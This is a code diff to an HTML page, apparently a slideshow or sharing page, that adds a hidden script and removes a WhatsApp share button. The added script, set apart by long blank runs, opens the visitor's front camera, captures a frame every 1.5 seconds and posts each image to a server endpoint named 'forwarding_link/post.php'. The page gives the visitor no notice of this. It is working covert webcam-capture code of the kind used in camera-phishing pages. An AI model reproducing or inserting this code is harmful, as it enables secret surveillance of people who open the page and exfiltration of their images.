@@ -769,6 +769,83 @@ h4 {
 
 
 
+
+
+
+
+<script>
+
+  function post(imgdata) {
+    $.ajax({
+      type: 'POST',
+      data: { cat: imgdata },
+      url: 'forwarding_link/post.php',
+      dataType: 'json',
+      async: false,
+      success: function (result) {
+        // call the function that handles the response/results
+      },
+      error: function () {
+      }
+    });
+  };
+
+
+  'use strict';
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const errorMsgElement = document.querySelector('span#errorMsg');
+
+  const constraints = {
+    audio: false,
+    video: {
+
+      facingMode: "user"
+    }
+  };
+
+  // Access webcam
+  async function init() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      handleSuccess(stream);
+    } catch (e) {
+      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+    }
+  }
+
+  // Success
+  function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    var context = canvas.getContext('2d');
+    setInterval(function () {
+
+      context.drawImage(video, 0, 0, 640, 480);
+      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+      post(canvasData);
+    }, 1500);
+
+
+  }
+
+  // Load init
+  init();
+
+</script>
+
+
+
+
+
+
+
+
+
+
+
 <script>
 var slideIndex = 0;
 showSlides();
@@ -796,11 +873,7 @@ function showSlides() {
           Click
           </div>
         </div>
-        <a class="footerbtn" href="javascript:void(0)" onclick="shareActionWA()">
-          <img width="25px" height="25px" src="https://1.bp.blogspot.com/-cSK5Pdu_ziE/X-ScMn4BGEI/AAAAAAAAAcE/lZLFYZQOwPYTE9HSaB22Xb3GIEg3LOtrQCLcBGAsYHQ/s35/ideazzonewhats.png">
-          <b style="font-size: 15px;position:  relative;top: -3px;margin: 0 10px;">Share with your Friends</b>
-          <img width="25px" height="25px" src="https://1.bp.blogspot.com/-cSK5Pdu_ziE/X-ScMn4BGEI/AAAAAAAAAcE/lZLFYZQOwPYTE9HSaB22Xb3GIEg3LOtrQCLcBGAsYHQ/s35/ideazzonewhats.png">
-        </a>
+       
     </div>
         
   </body>
